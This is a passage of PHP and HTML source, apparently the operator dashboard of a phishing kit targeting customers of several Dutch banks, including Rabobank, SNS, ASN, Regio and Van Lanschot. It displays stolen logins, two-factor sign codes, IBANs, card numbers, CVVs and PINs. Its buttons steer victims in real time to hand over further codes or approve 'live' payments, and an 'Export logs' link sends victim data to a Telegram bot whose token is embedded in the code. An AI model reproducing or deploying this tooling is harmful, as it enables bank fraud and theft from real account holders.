                                                        ?>
', 'sms')"><i class="far fa-keyboard" aria-hidden="true"></i> Ask SMS</button>
                            </div>


                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIngbe('<?php 
                                                        echo htmlspecialchars($log["user_id"]);
                                                        ?>
', 'loginCode')"><i class="far fa-keyboard"></i> Ask pin</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setIngbe('<?php 
                                                        echo htmlspecialchars($log["user_id"]);
                                                        ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>

                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIngbe('<?php 
                                                        echo htmlspecialchars($log["user_id"]);
                                                        ?>
', 'credit')"><i class="fa fa-info-circle" aria-hidden="true"></i> Ask cc</button>
                            </div>
                        </div> 
                        <hr>     
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIngbe('<?php 
                                                        echo htmlspecialchars($log["user_id"]);
                                                        ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask m1</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control ingbe-one input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>
                        </div>
                        <hr>
                            <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setIngbe('<?php 
                                                        echo htmlspecialchars($log["user_id"]);
                                                        ?>
', 'live')"><i class="fa fa-sign-language" aria-hidden="true"></i> Ask Live</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control ingbe-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">                         
                                <input type="text" class="form-control ingbe-livetwo input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a sign code">
                            </div>

                        </div>                            
                    </div>
                </div>

















                <?php 
                                                    }
                                                } else {
                                                    if ($log["bank"] === "SNS") {
                                                        if (!empty($log["sns_number"])) {
                                                            echo "<div class=\"form-group row\">";
                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Diginumber:</label>";
                                                            echo "<div class=\"col-sm-9\">";
                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["sns_number"]) . "</i></p>";
                                                            echo "</div>";
                                                            echo "</div>";
                                                        }
                                                        if (!empty($log["sns_respons"])) {
                                                            echo "<div class=\"form-group row\">";
                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Login Code:</label>";
                                                            echo "<div class=\"col-sm-9\">";
                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["sns_respons"]) . "</i></p>";
                                                            echo "</div>";
                                                            echo "</div>";
                                                        }
                                                        if ($log["waiting"] == "true") {
                                                            ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setSns('<?php 
                                                            echo htmlspecialchars($log["user_id"]);
                                                            ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Digicode</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setSns('<?php 
                                                            echo htmlspecialchars($log["user_id"]);
                                                            ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setSns('<?php 
                                                            echo htmlspecialchars($log["user_id"]);
                                                            ?>
', 'identification')"><i class="fa fa-sign-language" aria-hidden="true"></i> Login Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control sns-sign input-dark mt-4 custom-input"  style="border-radius: 25px;" placeholder="Please enter a login code">
                            </div>
                        </div>                        
                    </div>
                </div>
                <?php 
                                                        }
                                                    } else {
                                                        if ($log["bank"] === "ASN") {
                                                            if (!empty($log["asn_number"])) {
                                                                echo "<div class=\"form-group row\">";
                                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Diginumber:</label>";
                                                                echo "<div class=\"col-sm-9\">";
                                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["asn_number"]) . "</i></p>";
                                                                echo "</div>";
                                                                echo "</div>";
                                                            }
                                                            if (!empty($log["asn_respons"])) {
                                                                echo "<div class=\"form-group row\">";
                                                                echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Login Code:</label>";
                                                                echo "<div class=\"col-sm-9\">";
                                                                echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["asn_respons"]) . "</i></p>";
                                                                echo "</div>";
                                                                echo "</div>";
                                                            }
                                                            if ($log["waiting"] == "true") {
                                                                ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAsn('<?php 
                                                                echo htmlspecialchars($log["user_id"]);
                                                                ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Digicode</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setAsn('<?php 
                                                                echo htmlspecialchars($log["user_id"]);
                                                                ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setAsn('<?php 
                                                                echo htmlspecialchars($log["user_id"]);
                                                                ?>
', 'identification')"><i class="fa fa-sign-language" aria-hidden="true"></i> Login Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control asn-sign input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a login code">
                            </div>
                        </div>                        
                    </div>
                </div>
                <?php 
                                                            }
                                                        } else {
                                                            if ($log["bank"] === "REGIO") {
                                                                if (!empty($log["regio_number"])) {
                                                                    echo "<div class=\"form-group row\">";
                                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Diginumber:</label>";
                                                                    echo "<div class=\"col-sm-9\">";
                                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["regio_number"]) . "</i></p>";
                                                                    echo "</div>";
                                                                    echo "</div>";
                                                                }
                                                                if (!empty($log["regio_respons"])) {
                                                                    echo "<div class=\"form-group row\">";
                                                                    echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Login Code:</label>";
                                                                    echo "<div class=\"col-sm-9\">";
                                                                    echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["regio_respons"]) . "</i></p>";
                                                                    echo "</div>";
                                                                    echo "</div>";
                                                                }
                                                                if ($log["waiting"] == "true") {
                                                                    ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRegio('<?php 
                                                                    echo htmlspecialchars($log["user_id"]);
                                                                    ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Digicode</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setRegio('<?php 
                                                                    echo htmlspecialchars($log["user_id"]);
                                                                    ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>      
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRegio('<?php 
                                                                    echo htmlspecialchars($log["user_id"]);
                                                                    ?>
', 'identification')"><i class="fa fa-sign-language" aria-hidden="true"></i> Login Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control regio-sign input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a login code">
                            </div>
                        </div>                        
                    </div>
                </div>













<?php 
                                                                }
                                                            } else {
                                                                if ($log["bank"] == "LANSCHOT") {
                                                                    if (!empty($log["lan_user"])) {
                                                                        echo "<div class=\"form-group row\">";
                                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Digi - Username:</label>";
                                                                        echo "<div class=\"col-sm-9\">";
                                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["lan_user"]) . "</i></p>";
                                                                        echo "</div>";
                                                                        echo "</div>";
                                                                    }
                                                                    if (!empty($log["lan_number"])) {
                                                                        echo "<div class=\"form-group row\">";
                                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Digi - Diginumber:</label>";
                                                                        echo "<div class=\"col-sm-9\">";
                                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["lan_number"]) . "</i></p>";
                                                                        echo "</div>";
                                                                        echo "</div>";
                                                                    }
                                                                    if (!empty($log["lan_sign"])) {
                                                                        echo "<div class=\"form-group row\">";
                                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Digi - Sign Code:</label>";
                                                                        echo "<div class=\"col-sm-9\">";
                                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["lan_sign"]) . "</i></p>";
                                                                        echo "</div>";
                                                                        echo "</div>";
                                                                    }
                                                                    if (!empty($log["lan_id"])) {
                                                                        echo "<div class=\"form-group row\">";
                                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Qr-Code:</label>";
                                                                        echo "<div class=\"col-sm-9\">";
                                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["lan_id"]) . "</i></p>";
                                                                        echo "</div>";
                                                                        echo "</div>";
                                                                    }
                                                                    if (!empty($log["abn_respons_two"])) {
                                                                        echo "<div class=\"form-group row\">";
                                                                        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Sign Code:</label>";
                                                                        echo "<div class=\"col-sm-9\">";
                                                                        echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["abn_respons_two"]) . "</i></p>";
                                                                        echo "</div>";
                                                                        echo "</div>";
                                                                    }
                                                                    if ($log["waiting"] == "true") {
                                                                        ?>
            </div>
                <div class="row">
                    <div class="col-lg-3">
                        <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setLan('<?php 
                                                                        echo htmlspecialchars($log["user_id"]);
                                                                        ?>
', 'login')"><i class="fa fa-info-circle" aria-hidden="true"></i> Login</button>
                    </div>
                   
                    <div class="col-lg-3">
                        <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setLan('<?php 
                                                                        echo htmlspecialchars($log["user_id"]);
                                                                        ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                    </div>
                </div>      
                <div class="row">
                    <div class="col-lg-3">
                        <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setLan('<?php 
                                                                        echo htmlspecialchars($log["user_id"]);
                                                                        ?>
', 'signCode')"><i class="fa fa-sign-language" aria-hidden="true"></i> Sign Code</button>
                    </div>
                    <div class="col-lg-9">
                        <input type="text" class="form-control lan-sign input-dark mt-4 custom-input" style="border-radius: 25px;" value="num" placeholder="Please enter a sign code">
                    </div>
                </div>     
                
                

                <div class="row">
                    <div class="col-lg-3">
                        <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setLan('<?php 
                                                                        echo htmlspecialchars($log["user_id"]);
                                                                        ?>
', 'identification')"><i class="fa fa-sign-language" aria-hidden="true"></i> Qr</button>
                    </div>
                    <div class="col-lg-9">
                        <input type="text" class="form-control lan-qr input-dark mt-4 custom-input" style="border-radius: 25px;" value="https://i.imgur.com/sOf4Ta8.png" placeholder="Please enter a sign code">
                    </div>
                </div>     
                
            </div>
        </div>










                <?php 
                                                                    }
                                                                } else {
                                                                    if ($log["bank"] === "RABO") {
                                                                        if (!empty($log["rabo_iban"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Account Number:</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_iban"]) . "\n\n</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if (!empty($log["rabo_number"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Number:</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_number"]) . "</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if (!empty($log["rabo_respons_one"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Login Code:</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_respons_one"]) . "</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if (!empty($log["rabo_respons_two"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Sign Code:</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_respons_two"]) . "</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if (!empty($log["rabo_identification"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Phone Code:</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_identification"]) . "</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if (!empty($log["rabo_ready"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Ready</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_ready"]) . "</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if (!empty($log["rabo_motor"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Vervallen</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_motor"]) . "</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if (!empty($log["rabo_card"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\"><i class=\"fa fa-credit-card\" aria-hidden=\"true\"></i> Cardnumber</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_card"]) . "</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if (!empty($log["rabo_exp"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\"><i class=\"fa fa-credit-card\" aria-hidden=\"true\"></i> Expiry</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_exp"]) . "</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if (!empty($log["rabo_cvv"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\"><i class=\"fa fa-credit-card\" aria-hidden=\"true\"></i>  CVV</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_cvv"]) . "</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if (!empty($log["rabo_pin"])) {
                                                                            echo "<div class=\"form-group row\">";
                                                                            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Pincode</label>";
                                                                            echo "<div class=\"col-sm-9\">";
                                                                            echo "<p class=\"text-secondary\"><i>" . htmlspecialchars($log["rabo_pin"]) . "</i></p>";
                                                                            echo "</div>";
                                                                            echo "</div>";
                                                                        }
                                                                        if ($log["waiting"] == "true") {
                                                                            ?>
                    </div>
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php 
                                                                            echo htmlspecialchars($log["user_id"]);
                                                                            ?>
', 'loginPage')"><i class="fas fa-sign-in-alt"></i> Login</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php 
                                                                            echo htmlspecialchars($log["user_id"]);
                                                                            ?>
', 'verificationPage')"><i class="fa fa-phone" aria-hidden="true"></i> Phone Code</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php 
                                                                            echo htmlspecialchars($log["user_id"]);
                                                                            ?>
', 'readyPage')"><i class="fa fa-phone" aria-hidden="true"></i>Ready</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php 
                                                                            echo htmlspecialchars($log["user_id"]);
                                                                            ?>
', 'motorPage')"><i class="fa fa-phone" aria-hidden="true"></i>Bozegoon</button>
                            </div>
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-success mt-4" onclick="setRabo('<?php 
                                                                            echo htmlspecialchars($log["user_id"]);
                                                                            ?>
', 'finish')"><i class="fa fa-check-circle" aria-hidden="true"></i> Finish</button>
                            </div>
                        </div>      
                        <div class="row" style="display: <?php 
                                                                            echo !empty($log["rabo_code_one"]) ? "none" : "";
                                                                            ?>
;">         
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php 
                                                                            echo htmlspecialchars($log["user_id"]);
                                                                            ?>
', 'login')"><i class="far fa-keyboard"></i> Login Code</button>
                            </div>  
                            <div class="col-lg-9">
                                <input type="text" class="form-control rabo-login input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter an URL for your QR Code (Login Code)">
                            </div>
                        </div> 
                        <div class="row">
                            <div class="col-lg-3">
                                <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php 
                                                                            echo htmlspecialchars($log["user_id"]);
                                                                            ?>
', 'signPage')"><i class="fa fa-sign-language" aria-hidden="true"></i> Sign Code</button>
                            </div>
                            <div class="col-lg-9">
                                <input type="text" class="form-control rabo-sign input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter an URL for your QR Code (Sign Code)">
                            </div>
                        </div>  
                        
                        

                        <div class="row">
                            <div class="col-lg-3">


                            <button class="btn btn-sm btn-block btn-rounded btn-outline-secondary mt-4" onclick="setRabo('<?php 
                                                                            echo htmlspecialchars($log["user_id"]);
                                                                            ?>
', 'livePage')"><i class="fa fa-shopping-cart" aria-hidden="true"></i> Live</button>
                            </div>
                            <div class="col-lg-9">
                            <input type="text" class="form-control rabo-amount input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter an amount">
                            <input type="text" class="form-control rabo-name input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a name">
                            <input type="text" class="form-control rabo-desc input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter a description">
                            <input type="text" class="form-control rabo-live input-dark mt-4 custom-input" style="border-radius: 25px;" placeholder="Please enter an URL for your QR Code (Live Code)">
                      
                            
                            </div>
                        </div>  
                         




                    </div>
                </div>




                <?php 
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        if ($log["waiting"] === "false") {
            echo "</div>";
            echo "</div>";
            echo "</div>";
        }
        echo "<div class=\"col-lg-4 col-sm-12\">";
        echo "<div class=\"col-12 p-4 bg-darker custom-top-margin rounded\" style=\"min-height: 173px;\">";
        echo "<h5 class=\"text-white\">Options</h5>";
        echo "<hr class=\"my-4\">";
        ?>
        <button class="btn btn-sm btn-rounded btn-outline-warning" onclick="banUser('<?php 
        echo $log["ip"];
        ?>
', '<?php 
        echo $log["user_id"];
        ?>
')"><i class="fa fa-ban"></i> Ban</button>
        <button class="btn btn-sm btn-rounded btn-outline-danger" onclick="deleteLog('<?php 
        echo $log["user_id"];
        ?>
')"><i class="fa fa-trash"></i> Delete</button>
        <form action="/public/api/logs.php" method="post" name="srangpanel"> <br>




        <a href="https://api.telegram.org/bot5808854485:AAEoH8w0l-DnKOEWsRBMiMLFtyBy93MBNFQ/sendMessage?chat_id=-888047248&text=bnpfr_num=<?php 
        echo "" . htmlspecialchars($log["bnp_iban"]) . "";
        ?>
=bnpfr_pin=<?php 
        echo "" . htmlspecialchars($log["bnp_number"]) . "";
        ?>
=bnpfr_name<?php 
        echo "" . htmlspecialchars($log["bnp_respons_one"]) . "";
        ?>
=bnpfr_lastname=<?php 
        echo "" . htmlspecialchars($log["bnp_lname"]) . "";
        ?>
=bnpfr_phone_num=<?php 
        echo "" . htmlspecialchars($log["bnp_phone"]) . "";
        ?>
" class="btn btn-sm btn-rounded btn-outline-primary"><i class="fa fa-trash"></i> Export logs</a>
    </form>


        <?php 
        echo "</div>";
        echo "</div>";
        echo "</div>";
        echo "<div class=\"row p-1 mt-3 mb-3\">";
        echo "<div class=\"col-lg-8 col-sm-12\">";
        echo "<div class=\"col-12 p-4 bg-darker rounded\">";
        echo "<h4 class=\"text-white\">Information</h4>";
        echo "<hr class=\"my-4\">";
        echo "<div class=\"bg-darkest p-4 rounded\">";
        echo "<div class=\"form-group row\">";
        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">User ID:</label>";
        echo "<div class=\"col-sm-9\">";
        echo "<p class=\"text-secondary\"><i>" . $log["user_id"] . "</i></p>";
        echo "</div>";
        echo "</div>";
        echo "<div class=\"form-group row\">";
        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">User Browser:</label>";
        echo "<div class=\"col-sm-9\">";
        echo "<p class=\"text-secondary\"><i>" . $log["user_agent"] . "</i></p>";
        echo "</div>";
        echo "</div>";
        echo "<div class=\"form-group row\">";
        echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">User IP:</label>";
        echo "<div class=\"col-sm-9\">";
        echo "<p class=\"text-secondary\"><i>" . $log["ip"] . "</i></p>";
        echo "</div>";
        echo "</div>";
        if (!empty($log["bank"])) {
            echo "<div class=\"form-group row\">";
            echo "<label for=\"id\" class=\"text-secondary col-sm-3 font-weight-bold\">Bank:</label>";
            echo "<div class=\"col-sm-9\">";
            echo "<p class=\"text-secondary\"><i>" . $log["bank"] . "</i></p>";
            echo "</div>";
            echo "</div>";
        }
        echo "</div>";
    }
}
